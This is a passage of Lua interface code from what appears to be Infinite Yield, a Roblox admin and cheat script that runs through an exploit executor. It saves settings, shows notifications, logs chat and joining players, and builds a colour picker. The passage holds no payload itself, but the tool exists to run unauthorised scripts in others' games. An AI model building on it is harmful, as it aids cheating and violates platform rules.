				frame4.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
				frame4.BorderSizePixel = 0
				frame4.Size = UDim2.new(0, 360, 0, 20)
				frame4.ZIndex = 10
				textLabel2.Name = "PopupText"
				textLabel2.Parent = frame4
				textLabel2.BackgroundTransparency = 1
				textLabel2.Size = UDim2.new(1, 0, 0.95, 0)
				textLabel2.ZIndex = 10
				textLabel2.Font = Enum.Font.SourceSans
				textLabel2.TextSize = 14
				textLabel2.Text = "File Error"
				textLabel2.TextColor3 = Color3.new(1, 1, 1)
				textLabel2.TextWrapped = true
				textButton2.Name = "Exit"
				textButton2.Parent = frame4
				textButton2.BackgroundTransparency = 1
				textButton2.Position = UDim2.new(1, -20, 0, 0)
				textButton2.Size = UDim2.new(0, 20, 0, 20)
				textButton2.Text = ""
				textButton2.ZIndex = 10
				imageLabel.Parent = textButton2
				imageLabel.BackgroundColor3 = Color3.new(1, 1, 1)
				imageLabel.BackgroundTransparency = 1
				imageLabel.Position = UDim2.new(0, 5, 0, 5)
				imageLabel.Size = UDim2.new(0, 10, 0, 10)
				imageLabel.Image = "rbxassetid://5054663650"
				imageLabel.ZIndex = 10

				textButton2.MouseButton1Click:Connect(function()
					frame2:Destroy()
				end)
			end
		end
	else
		prefix = ";"
		StayOpen = false
		KeepInfYield = true
		espTransparency = 0.3
		logsEnabled = false
		jLogsEnabled = false
		aliases = {}
		binds = {}
		WayPoints = {}
		PluginsTable = {}
	end
end

saves()

updatesaves = function()
	if nosaves == false and writefileExploit() then
		writefileCooldown("IY_FE.iy", HttpService:JSONEncode({
			prefix = prefix,
			StayOpen = StayOpen,
			keepIY = KeepInfYield,
			espTransparency = espTransparency,
			logsEnabled = logsEnabled,
			jLogsEnabled = jLogsEnabled,
			aliases = aliases,
			binds = binds or {},
			WayPoints = AllWaypoints,
			PluginsTable = PluginsTable,
			currentShade1 = { currentShade1.R, currentShade1.G, currentShade1.B },
			currentShade2 = { currentShade2.R, currentShade2.G, currentShade2.B },
			currentShade3 = { currentShade3.R, currentShade3.G, currentShade3.B },
			currentText1 = { currentText1.R, currentText1.G, currentText1.B },
			currentText2 = { currentText2.R, currentText2.G, currentText2.B },
			currentScroll = { currentScroll.R, currentScroll.G, currentScroll.B },
			eventBinds = eventEditor.SaveData(),
			vapeHudEnabled = getgenv().VapeHudEnabled ~= false,
			vapeHudKey = getgenv().VapeHudKey and getgenv().VapeHudKey.Name or "RightShift",
		}))
	end
end

eventEditor.SetOnEdited(updatesaves)
pWayPoints = {}
WayPoints = {}

if #AllWaypoints > 0 then
	for i = 1, #AllWaypoints do
		if not AllWaypoints[i].GAME or AllWaypoints[i].GAME == PlaceId then
			WayPoints[#WayPoints + 1] = {
				NAME = AllWaypoints[i].NAME,
				COORD = {
					AllWaypoints[i].COORD[1],
					AllWaypoints[i].COORD[2],
					AllWaypoints[i].COORD[3],
				},
				GAME = AllWaypoints[i].GAME,
			}
		end
	end
end

if type(binds) ~= "table" then
	binds = {}
end

for i = #binds, 1, -1 do
	if binds[i].COMMAND == "clicktp" or binds[i].COMMAND == "clickdel" then
		table.remove(binds, i)
	end
end

Time = function()
	local n = math.floor(tick() % 86400 / 3600)
	local n2 = math.floor(tick() % 3600 / 60)
	local n3 = math.floor(tick() % 60)
	local str = n > 11 and "PM" or "AM"
	local n4 = n % 12 == 0 and 12 or n % 12
	return (n4 < 10 and "0" .. n4 or n4) .. ":" .. (n2 < 10 and "0" .. n2 or n2) .. ":" .. (n3 < 10 and "0" .. n3 or n3) .. " " .. str
end

PrefixBox.Text = prefix
local safeGet

do
	local flag2 = false
	local flag3 = false

	if StayOpen == false then
		On.BackgroundTransparency = 1
	else
		On.BackgroundTransparency = 0
	end

	if logsEnabled then
		Toggle.Text = "Enabled"
	else
		Toggle.Text = "Disabled"
	end

	if jLogsEnabled then
		Toggle_2.Text = "Enabled"
	else
		Toggle_2.Text = "Disabled"
	end

	maximizeHolder = function()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -220), "InOut", "Quart", 0.2, true, nil)
		end
	end

	local n = -20

	minimizeHolder = function()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, n), "InOut", "Quart", 0.5, true, nil)
		end
	end

	cmdbarHolder = function()
		if StayOpen == false then
			Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -45), "InOut", "Quart", 0.5, true, nil)
		end
	end

	pinNotification = nil
	local n2 = 0

	notify = function(text, text3, arg)
		if getgenv().NOTIFY == false then
			return
		end

		task.spawn(function()
			local n3 = n2 + 1
			local flag4 = false
			n2 += 1

			if pinNotification then
				pinNotification:Disconnect()
			end

			pinNotification = PinButton.MouseButton1Click:Connect(function()
				task.spawn(function()
					pinNotification:Disconnect()
					flag4 = true
					Title_2.BackgroundTransparency = 1
					wait(0.5)
					Title_2.BackgroundTransparency = 0
				end)
			end)

			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
			wait(0.6)
			local flag5 = false

			if text3 then
				Title_2.Text = text
				Text_2.Text = text3
			else
				Title_2.Text = "Notification"
				Text_2.Text = text
			end

			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, -100), "InOut", "Quart", 0.5, true, nil)

			CloseButton.MouseButton1Click:Connect(function()
				Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				flag5 = true
				pinNotification:Disconnect()
			end)

			if arg and isNumber(arg) then
				wait(arg)
			else
				wait(10)
			end

			if n3 == n2 then
				if flag5 == false and flag4 == false then
					pinNotification:Disconnect()
					Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
				end

				n2 = 0
			end
		end)
	end

	local str = nil
	local v = nil
	local n3 = 1

	CreateLabel = function(name, arg)
		if str == name .. arg then
			n3 += 1
			local str2 = " - [" .. name .. "]: " .. arg .. " (x" .. n3 .. ")"
			v.Text = Time() .. str2
		else
			if n3 > 1 then
				n3 = 1
			end

			if #scroll_2:GetChildren() >= 2546 then
				scroll_2:ClearAllChildren()
			end

			local n4 = 0

			for _, child in pairs(scroll_2:GetChildren()) do
				if child then
					n4 = child.Size.Y.Offset + n4
				end

				if not child then
					n4 = 0
				end
			end

			local textLabel = Instance.new("TextLabel")
			str = name .. arg
			v = textLabel
			textLabel.Name = name
			textLabel.Parent = scroll_2
			textLabel.ZIndex = 10
			textLabel.Text = Time() .. " - [" .. name .. "]: " .. arg
			textLabel.Size = UDim2.new(0, 322, 0, 84)
			textLabel.BackgroundTransparency = 1
			textLabel.BorderSizePixel = 0
			textLabel.Font = "SourceSans"
			textLabel.Position = UDim2.new(-1, 0, 0, n4)
			textLabel.TextTransparency = 1
			textLabel.TextScaled = false
			textLabel.TextSize = 14
			textLabel.TextWrapped = true
			textLabel.TextXAlignment = "Left"
			textLabel.TextYAlignment = "Top"
			textLabel.TextColor3 = currentText1
			textLabel.Size = UDim2.new(0, 322, 0, textLabel.TextBounds.Y)
			table.insert(text1, textLabel)
			scroll_2.CanvasSize = UDim2.new(0, 0, 0, n4 + textLabel.TextBounds.Y)
			scroll_2.CanvasPosition = Vector2.new(0, scroll_2.CanvasPosition.Y + textLabel.TextBounds.Y)
			textLabel:TweenPosition(UDim2.new(0, 3, 0, n4), "In", "Quint", 0.5)

			for i = 0, 50 do
				wait(0.05)
				textLabel.TextTransparency = textLabel.TextTransparency - 0.05
			end

			textLabel.TextTransparency = 0
		end
	end

	CreateJoinLabel = function(arg, arg2)
		if #scroll_3:GetChildren() >= 2546 then
			scroll_3:ClearAllChildren()
		end

		local frame2 = Instance.new("Frame")
		local textLabel = Instance.new("TextLabel")
		local textLabel2 = Instance.new("TextLabel")
		local imageLabel = Instance.new("ImageLabel")
		frame2.Name = randomString()
		frame2.Parent = scroll_3
		frame2.BackgroundColor3 = Color3.new(1, 1, 1)
		frame2.BackgroundTransparency = 1
		frame2.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
		frame2.Size = UDim2.new(1, 0, 0, 50)
		textLabel.Name = randomString()
		textLabel.Parent = frame2
		textLabel.BackgroundTransparency = 1
		textLabel.BorderSizePixel = 0
		textLabel.Position = UDim2.new(0, 45, 0, 0)
		textLabel.Size = UDim2.new(0, 135, 1, 0)
		textLabel.ZIndex = 10
		textLabel.Font = Enum.Font.SourceSans
		textLabel.FontSize = Enum.FontSize.Size14
		textLabel.Text = "Username: " .. arg.Name .. "\nJoined Server: " .. Time()
		textLabel.TextColor3 = Color3.new(1, 1, 1)
		textLabel.TextWrapped = true
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel2.Name = randomString()
		textLabel2.Parent = frame2
		textLabel2.BackgroundTransparency = 1
		textLabel2.BorderSizePixel = 0
		textLabel2.Position = UDim2.new(0, 185, 0, 0)
		textLabel2.Size = UDim2.new(0, 140, 1, -5)
		textLabel2.ZIndex = 10
		textLabel2.Font = Enum.Font.SourceSans
		textLabel2.FontSize = Enum.FontSize.Size14
		textLabel2.Text = "User ID: " .. arg2 .. "\nAccount Age: " .. arg.AccountAge .. "\nJoined Roblox: Loading..."
		textLabel2.TextColor3 = Color3.new(1, 1, 1)
		textLabel2.TextWrapped = true
		textLabel2.TextXAlignment = Enum.TextXAlignment.Left
		textLabel2.TextYAlignment = Enum.TextYAlignment.Center
		imageLabel.Parent = frame2
		imageLabel.BackgroundTransparency = 1
		imageLabel.BorderSizePixel = 0
		imageLabel.Size = UDim2.new(0, 45, 1, 0)
		imageLabel.Image = Players:GetUserThumbnailAsync(arg2, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
		scroll_3.CanvasSize = UDim2.new(0, 0, 0, listlayout.AbsoluteContentSize.Y)
		scroll_3.CanvasPosition = Vector2.new(0, scroll_2.CanvasPosition.Y + frame2.AbsoluteSize.Y)
		wait()
		local response = game:HttpGet("https://users.roblox.com/v1/users/" .. arg2)
		local v2 = string.split(HttpService:JSONDecode(response).created:sub(1, 10), "-")
		textLabel2.Text = string.gsub(textLabel2.Text, "Loading...", v2[2] .. "/" .. v2[3] .. "/" .. v2[1])
	end

	IYMouse.KeyDown:Connect(function(arg)
		if arg == prefix then
			Cmdbar:CaptureFocus()

			spawn(function()
				repeat
					Cmdbar.Text = ""
				until Cmdbar.Text == ""
			end)

			maximizeHolder()
		end
	end)

	local n4 = 0

	Holder.MouseEnter:Connect(function()
		n4 = 0
		maximizeHolder()
	end)

	Holder.MouseLeave:Connect(function()
		if not Cmdbar:IsFocused() then
			local now = tick()
			n4 = now
			wait(1)
			if n4 ~= now then
				return
			end

			if not Cmdbar:IsFocused() then
				minimizeHolder()
			end
		end
	end)

	updateColors = function(backgroundColor3, arg)
		if arg == shade1 then
			for _, v2 in pairs(shade1) do
				v2.BackgroundColor3 = backgroundColor3
			end

			currentShade1 = backgroundColor3
		elseif arg == shade2 then
			for _, v2 in pairs(shade2) do
				v2.BackgroundColor3 = backgroundColor3
			end

			currentShade2 = backgroundColor3
		elseif arg == shade3 then
			for _, v2 in pairs(shade3) do
				v2.BackgroundColor3 = backgroundColor3
			end

			currentShade3 = backgroundColor3
		elseif arg == text1 then
			for _, v2 in pairs(text1) do
				v2.TextColor3 = backgroundColor3

				if v2:IsA("TextBox") then
					v2.PlaceholderColor3 = backgroundColor3
				end
			end

			currentText1 = backgroundColor3
		elseif arg == text2 then
			for _, v2 in pairs(text2) do
				v2.TextColor3 = backgroundColor3
			end

			currentText2 = backgroundColor3
		elseif arg == scroll then
			for _, v2 in pairs(scroll) do
				v2.ScrollBarImageColor3 = backgroundColor3
			end

			currentScroll = backgroundColor3
		end
	end

	local flag4 = false

	ColorsButton.MouseButton1Click:Connect(function()
		cache_currentShade1 = currentShade1
		cache_currentShade2 = currentShade2
		cache_currentShade3 = currentShade3
		cache_currentText1 = currentText1
		cache_currentText2 = currentText2
		cache_currentScroll = currentScroll

		if not flag4 then
			flag4 = true
			picker = game:GetObjects("rbxassetid://4908465318")[1]
			picker.Name = randomString()
			picker.Parent = PARENT
			picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)

			local v2 = ({ new = function()
				local obj = setmetatable({}, {})
				local colorPicker = picker.ColorPicker
				local exit = colorPicker.TopBar.Exit
				local content = colorPicker.Content
				local colorSpace = content.ColorSpaceFrame.ColorSpace
				local colorStrip = content.ColorStrip
				local preview = content.Preview
				local basicColors = content.BasicColors
				local customColors = content.CustomColors
				local default = content.Default
				local cancel = content.Cancel
				local shade1_ = content.Shade1
				local shade2_ = content.Shade2
				local shade3_ = content.Shade3
				local text1_ = content.Text1
				local text2_ = content.Text2
				local scroll_ = content.Scroll
				local scope = colorSpace.Scope
				local arrow = content.ArrowFrame.Arrow
				local input = content.Hue.Input
				local input2 = content.Sat.Input
				local input3 = content.Val.Input
				local input4 = content.Red.Input
				local input5 = content.Green.Input
				local input6 = content.Blue.Input
				local _IYMouse = IYMouse
				local n5 = 0
				local n6 = 0
				local n7 = 1
				local n8 = 1
				local n9 = 1
				local n10 = 1
				local color = Color3.new(0, 0, 0)
				local tbl5 = {}
				local color2 = Color3.new(0, 0, 0)
				local color3 = Color3.new(0.66666668653488, 0, 0)
				local color4 = Color3.new(0, 0.33333334326744, 0)
				local color5 = Color3.new(0.66666668653488, 0.33333334326744, 0)
				local color6 = Color3.new(0, 0.66666668653488, 0)
				local color7 = Color3.new(0.66666668653488, 0.66666668653488, 0)
				local color8 = Color3.new(0, 1, 0)
				local color9 = Color3.new(0.66666668653488, 1, 0)
				local color10 = Color3.new(0, 0, 0.49803924560547)
				local color11 = Color3.new(0.66666668653488, 0, 0.49803924560547)
				local color12 = Color3.new(0, 0.33333334326744, 0.49803924560547)
				local color13 = Color3.new(0.66666668653488, 0.33333334326744, 0.49803924560547)
				local color14 = Color3.new(0, 0.66666668653488, 0.49803924560547)
				local color15 = Color3.new(0.66666668653488, 0.66666668653488, 0.49803924560547)
				local color16 = Color3.new(0, 1, 0.49803924560547)
				local color17 = Color3.new(0.66666668653488, 1, 0.49803924560547)
				local color18 = Color3.new(0, 0, 1)
				local color19 = Color3.new(0.66666668653488, 0, 1)
				local color20 = Color3.new(0, 0.33333334326744, 1)
				local color21 = Color3.new(0.66666668653488, 0.33333334326744, 1)
				local color22 = Color3.new(0, 0.66666668653488, 1)
				local color23 = Color3.new(0.66666668653488, 0.66666668653488, 1)
				local color24 = Color3.new(0, 1, 1)
				local color25 = Color3.new(0.66666668653488, 1, 1)
				local color26 = Color3.new(0.33333334326744, 0, 0)
				local color27 = Color3.new(1, 0, 0)
				local color28 = Color3.new(0.33333334326744, 0.33333334326744, 0)
				local color29 = Color3.new(1, 0.33333334326744, 0)
				local color30 = Color3.new(0.33333334326744, 0.66666668653488, 0)
				local color31 = Color3.new(1, 0.66666668653488, 0)
				local color32 = Color3.new(0.33333334326744, 1, 0)
				local color33 = Color3.new(1, 1, 0)
				local color34 = Color3.new(0.33333334326744, 0, 0.49803924560547)
				local color35 = Color3.new(1, 0, 0.49803924560547)
				local color36 = Color3.new(0.33333334326744, 0.33333334326744, 0.49803924560547)
				local color37 = Color3.new(1, 0.33333334326744, 0.49803924560547)
				local color38 = Color3.new(0.33333334326744, 0.66666668653488, 0.49803924560547)
				local color39 = Color3.new(1, 0.66666668653488, 0.49803924560547)
				local color40 = Color3.new(0.33333334326744, 1, 0.49803924560547)
				local color41 = Color3.new(1, 1, 0.49803924560547)
				local color42 = Color3.new(0.33333334326744, 0, 1)
				local color43 = Color3.new(1, 0, 1)
				local color44 = Color3.new(0.33333334326744, 0.33333334326744, 1)
				local color45 = Color3.new(1, 0.33333334326744, 1)
				local color46 = Color3.new(0.33333334326744, 0.66666668653488, 1)
				local color47 = Color3.new(1, 0.66666668653488, 1)
				local color48 = Color3.new(0.33333334326744, 1, 1)
				tbl5[1] = color2
				tbl5[2] = color3
				tbl5[3] = color4
				tbl5[4] = color5
				tbl5[5] = color6
				tbl5[6] = color7
				tbl5[7] = color8
				tbl5[8] = color9
				tbl5[9] = color10
				tbl5[10] = color11
				tbl5[11] = color12
				tbl5[12] = color13
				tbl5[13] = color14
				tbl5[14] = color15
				tbl5[15] = color16
				tbl5[16] = color17
				tbl5[17] = color18
				tbl5[18] = color19
				tbl5[19] = color20
				tbl5[20] = color21
				tbl5[21] = color22
				tbl5[22] = color23
				tbl5[23] = color24
				tbl5[24] = color25
				tbl5[25] = color26
				tbl5[26] = color27
				tbl5[27] = color28
				tbl5[28] = color29
				tbl5[29] = color30
				tbl5[30] = color31
				tbl5[31] = color32
				tbl5[32] = color33
				tbl5[33] = color34
				tbl5[34] = color35
				tbl5[35] = color36
				tbl5[36] = color37
				tbl5[37] = color38
				tbl5[38] = color39
				tbl5[39] = color40
				tbl5[40] = color41
				tbl5[41] = color42
				tbl5[42] = color43
				tbl5[43] = color44
				tbl5[44] = color45
				tbl5[45] = color46
				tbl5[46] = color47
				tbl5[47] = color48

				do
					local values = table.pack(Color3.new(1, 1, 1))
					table.move(values, 1, values.n, 48, tbl5)
				end

				local tbl6 = {}
				dragGUI(picker)

				local function fn2(arg)
					local n11 = 219 - n5 * 219
					local n12 = 199 - n6 * 199
					local n13 = 199 - n7 * 199
					Color3.fromHSV(n5, n6, n7)

					if arg == 2 or not arg then
						input.Text = tostring(math.ceil(359 * n5))
						input2.Text = tostring(math.ceil(255 * n6))
						input3.Text = tostring(math.floor(255 * n7))
					end

					if arg == 1 or not arg then
						input4.Text = tostring(math.floor(255 * n8))
						input5.Text = tostring(math.floor(255 * n9))
						input6.Text = tostring(math.floor(255 * n10))
					end

					color = Color3.new(n8, n9, n10)
					scope.Position = UDim2.new(0, n11 - 9, 0, n12 - 9)
					colorStrip.ImageColor3 = Color3.fromHSV(n5, n6, 1)
					arrow.Position = UDim2.new(0, -2, 0, n13 - 4)
					preview.BackgroundColor3 = color
					obj.Color = color

					if obj.Changed then
						obj:Changed(color)
					end
				end

				local function fn3()
					local n11 = _IYMouse.X - colorSpace.AbsolutePosition.X
					local n12 = _IYMouse.Y - colorSpace.AbsolutePosition.Y

					if n11 < 0 then
						n11 = 0
					elseif n11 > 219 then
						n11 = 219
					end

					if n12 < 0 then
						n12 = 0
					elseif n12 > 199 then
						n12 = 199
					end

					n5 = (219 - n11) / 219
					n6 = (199 - n12) / 199
					local color49 = Color3.fromHSV(n5, n6, n7)
					local r = color49.r
					local g = color49.g
					local b = color49.b
					n8 = r
					n9 = g
					n10 = b
					fn2()
				end

				local function fn4()
					local n11 = _IYMouse.Y - colorStrip.AbsolutePosition.Y

					if n11 < 0 then
						n11 = 0
					elseif n11 > 199 then
						n11 = 199
					end

					n7 = (199 - n11) / 199
					local color49 = Color3.fromHSV(n5, n6, n7)
					local r = color49.r
					local g = color49.g
					local b = color49.b
					n8 = r
					n9 = g
					n10 = b
					fn2()
				end

				local function fn5(arg, arg2)
					arg.ArrowFrame.Up.InputBegan:Connect(function(input7)
						if input7.UserInputType == Enum.UserInputType.MouseMovement then
							arg.ArrowFrame.Up.BackgroundTransparency = 0.5
						elseif input7.UserInputType == Enum.UserInputType.MouseButton1 then
							local connection = nil
							local now = tick()
							local flag5 = true
							local num = tonumber(arg.Text)
							if not num then
								return
							end

							connection = UserInputService.InputEnded:Connect(function(input8)
								if input8.UserInputType ~= Enum.UserInputType.MouseButton1 then
									return
								end
								connection:Disconnect()
								flag5 = false
							end)

							local n11 = num + 1
							arg2(n11)

							while flag5 do
								if tick() - now > 0.3 then
									n11 += 1
									arg2(n11)
								end

								wait(0.1)
							end
						end
					end)

					arg.ArrowFrame.Up.InputEnded:Connect(function(input7)
						if input7.UserInputType == Enum.UserInputType.MouseMovement then
							arg.ArrowFrame.Up.BackgroundTransparency = 1
						end
					end)

					arg.ArrowFrame.Down.InputBegan:Connect(function(input7)
						if input7.UserInputType == Enum.UserInputType.MouseMovement then
							arg.ArrowFrame.Down.BackgroundTransparency = 0.5
						elseif input7.UserInputType == Enum.UserInputType.MouseButton1 then
							local connection = nil
							local now = tick()
							local flag5 = true
							local num = tonumber(arg.Text)
							if not num then
								return
							end

							connection = UserInputService.InputEnded:Connect(function(input8)
								if input8.UserInputType ~= Enum.UserInputType.MouseButton1 then
									return
								end
								connection:Disconnect()
								flag5 = false
							end)

							local n11 = num - 1
							arg2(n11)

							while flag5 do
								if tick() - now > 0.3 then
									n11 -= 1
									arg2(n11)
								end

								wait(0.1)
							end
						end
					end)

					arg.ArrowFrame.Down.InputEnded:Connect(function(input7)
						if input7.UserInputType == Enum.UserInputType.MouseMovement then
							arg.ArrowFrame.Down.BackgroundTransparency = 1
						end
					end)
				end

				colorSpace.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseButton1 then
						local connection = nil
						local connection2 = nil

						connection = UserInputService.InputEnded:Connect(function(input8)
							if input8.UserInputType ~= Enum.UserInputType.MouseButton1 then
								return
							end
							connection:Disconnect()
							connection2:Disconnect()
						end)

						connection2 = UserInputService.InputChanged:Connect(function(input8)
							if input8.UserInputType == Enum.UserInputType.MouseMovement then
								fn3()
							end
						end)

						fn3()
					end
				end)

				colorStrip.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseButton1 then
						local connection = nil
						local connection2 = nil

						connection = UserInputService.InputEnded:Connect(function(input8)
							if input8.UserInputType ~= Enum.UserInputType.MouseButton1 then
								return
							end
							connection:Disconnect()
							connection2:Disconnect()
						end)

						connection2 = UserInputService.InputChanged:Connect(function(input8)
							if input8.UserInputType == Enum.UserInputType.MouseMovement then
								fn4()
							end
						end)

						fn4()
					end
				end)

				local function fn6(arg)
					local num = tonumber(arg)

					if num then
						n5 = math.clamp(math.floor(num), 0, 359) / 359
						local color49 = Color3.fromHSV(n5, n6, n7)
						local r = color49.r
						local g = color49.g
						local b = color49.b
						n8 = r
						n9 = g
						n10 = b
						input.Text = tostring(n5 * 359)
						fn2(1)
					end
				end

				input.FocusLost:Connect(function()
					fn6(input.Text)
				end)

				fn5(input, fn6)

				local function fn7(arg)
					local num = tonumber(arg)

					if num then
						n6 = math.clamp(math.floor(num), 0, 255) / 255
						local color49 = Color3.fromHSV(n5, n6, n7)
						local g = color49.g
						local b = color49.b
						n8 = color49.r
						n9 = g
						n10 = b
						input2.Text = tostring(n6 * 255)
						fn2(1)
					end
				end

				input2.FocusLost:Connect(function()
					fn7(input2.Text)
				end)

				fn5(input2, fn7)

				local function fn8(arg)
					local num = tonumber(arg)

					if num then
						n7 = math.clamp(math.floor(num), 0, 255) / 255
						local color49 = Color3.fromHSV(n5, n6, n7)
						local g = color49.g
						local b = color49.b
						n8 = color49.r
						n9 = g
						n10 = b
						input3.Text = tostring(n7 * 255)
						fn2(1)
					end
				end

				input3.FocusLost:Connect(function()
					fn8(input3.Text)
				end)

				fn5(input3, fn8)

				local function fn9(arg)
					local num = tonumber(arg)

					if num then
						n8 = math.clamp(math.floor(num), 0, 255) / 255
						local color49 = Color3.new(n8, n9, n10)
						local color50, color51, color52 = Color3.toHSV(color49)
						n5 = color50
						n6 = color51
						n7 = color52
						input4.Text = tostring(n8 * 255)
						fn2(2)
					end
				end

				input4.FocusLost:Connect(function()
					fn9(input4.Text)
				end)

				fn5(input4, fn9)

				local function fn10(arg)
					local num = tonumber(arg)

					if num then
						n9 = math.clamp(math.floor(num), 0, 255) / 255
						local color49 = Color3.new(n8, n9, n10)
						local color50, color51, color52 = Color3.toHSV(color49)
						n5 = color50
						n6 = color51
						n7 = color52
						input5.Text = tostring(n9 * 255)
						fn2(2)
					end
				end

				input5.FocusLost:Connect(function()
					fn10(input5.Text)
				end)

				fn5(input5, fn10)

				local function fn11(arg)
					local num = tonumber(arg)

					if num then
						n10 = math.clamp(math.floor(num), 0, 255) / 255
						local color49 = Color3.new(n8, n9, n10)
						local color50, color51, color52 = Color3.toHSV(color49)
						n5 = color50
						n6 = color51
						n7 = color52
						input6.Text = tostring(n10 * 255)
						fn2(2)
					end
				end

				input6.FocusLost:Connect(function()
					fn11(input6.Text)
				end)

				fn5(input6, fn11)
				local textButton2 = Instance.new("TextButton")
				textButton2.Name = "Choice"
				textButton2.Size = UDim2.new(0, 25, 0, 18)
				textButton2.BorderColor3 = Color3.new(0.37647058823529411, 0.37647058823529411, 0.37647058823529411)
				textButton2.Text = ""
				textButton2.AutoButtonColor = false
				textButton2.ZIndex = 10
				local n11 = 0
				local n12 = 0

				for _, v2 in pairs(tbl5) do
					local clone = textButton2:Clone()
					clone.BackgroundColor3 = v2
					clone.Position = UDim2.new(0, 1 + 30 * n11, 0, 21 + 23 * n12)

					clone.MouseButton1Click:Connect(function()
						local g = v2.g
						local b = v2.b
						n8 = v2.r
						n9 = g
						n10 = b
						local color49 = Color3.new(n8, n9, n10)
						local color50, color51, color52 = Color3.toHSV(color49)
						n5 = color50
						n6 = color51
						n7 = color52
						fn2()
					end)

					clone.Parent = basicColors
					n11 += 1

					if n11 == 6 then
						n12 += 1
						n11 = 0
					end
				end

				local n13 = 0
				local n14 = 0

				for i = 1, 12 do
					local color49 = tbl6[i] or Color3.new(0, 0, 0)
					local clone = textButton2:Clone()
					clone.BackgroundColor3 = color49
					clone.Position = UDim2.new(0, 1 + 30 * n13, 0, 20 + 23 * n14)

					clone.MouseButton1Click:Connect(function()
						local color50 = tbl6[i] or Color3.new(0, 0, 0)
						local g = color50.g
						local b = color50.b
						n8 = color50.r
						n9 = g
						n10 = b
						local color51, color52, color53 = Color3.toHSV(color50)
						n5 = color51
						n6 = color52
						n7 = color53
						fn2()
					end)

					clone.MouseButton2Click:Connect(function()
						tbl6[i] = color
						clone.BackgroundColor3 = color
					end)

					clone.Parent = customColors
					n13 += 1

					if n13 == 6 then
						n14 += 1
						n13 = 0
					end
				end

				shade1_.MouseButton1Click:Connect(function()
					if obj.Confirm then
						obj:Confirm(color, shade1)
					end
				end)

				shade1_.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						shade1_.BackgroundTransparency = 0.4
					end
				end)

				shade1_.InputEnded:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						shade1_.BackgroundTransparency = 0
					end
				end)

				shade2_.MouseButton1Click:Connect(function()
					if obj.Confirm then
						obj:Confirm(color, shade2)
					end
				end)

				shade2_.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						shade2_.BackgroundTransparency = 0.4
					end
				end)

				shade2_.InputEnded:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						shade2_.BackgroundTransparency = 0
					end
				end)

				shade3_.MouseButton1Click:Connect(function()
					if obj.Confirm then
						obj:Confirm(color, shade3)
					end
				end)

				shade3_.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						shade3_.BackgroundTransparency = 0.4
					end
				end)

				shade3_.InputEnded:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						shade3_.BackgroundTransparency = 0
					end
				end)

				text1_.MouseButton1Click:Connect(function()
					if obj.Confirm then
						obj:Confirm(color, text1)
					end
				end)

				text1_.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						text1_.BackgroundTransparency = 0.4
					end
				end)

				text1_.InputEnded:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						text1_.BackgroundTransparency = 0
					end
				end)

				text2_.MouseButton1Click:Connect(function()
					if obj.Confirm then
						obj:Confirm(color, text2)
					end
				end)

				text2_.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						text2_.BackgroundTransparency = 0.4
					end
				end)

				text2_.InputEnded:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						text2_.BackgroundTransparency = 0
					end
				end)

				scroll_.MouseButton1Click:Connect(function()
					if obj.Confirm then
						obj:Confirm(color, scroll)
					end
				end)

				scroll_.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						scroll_.BackgroundTransparency = 0.4
					end
				end)

				scroll_.InputEnded:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						scroll_.BackgroundTransparency = 0
					end
				end)

				cancel.MouseButton1Click:Connect(function()
					if obj.Cancel then
						obj:Cancel()
					end
				end)

				cancel.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						cancel.BackgroundTransparency = 0.4
					end
				end)

				cancel.InputEnded:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						cancel.BackgroundTransparency = 0
					end
				end)

				default.MouseButton1Click:Connect(function()
					if obj.Default then
						obj:Default()
					end
				end)

				default.InputBegan:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						default.BackgroundTransparency = 0.4
					end
				end)

				default.InputEnded:Connect(function(input7)
					if input7.UserInputType == Enum.UserInputType.MouseMovement then
						default.BackgroundTransparency = 0
					end
				end)

				exit.MouseButton1Click:Connect(function()
					picker:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil)
				end)

				fn2()

				obj.SetColor = function(arg, arg2)
					local g = arg2.g
					local b = arg2.b
					n8 = arg2.r
					n9 = g
					n10 = b
					local color49, color50, color51 = Color3.toHSV(arg2)
					n5 = color49
					n6 = color50
					n7 = color51
					fn2()
				end

				return obj
			end }).new()

			v2.Confirm = function(arg, arg2, arg3)
				updateColors(arg2, arg3)
				wait()
				updatesaves()
			end

			v2.Cancel = function()
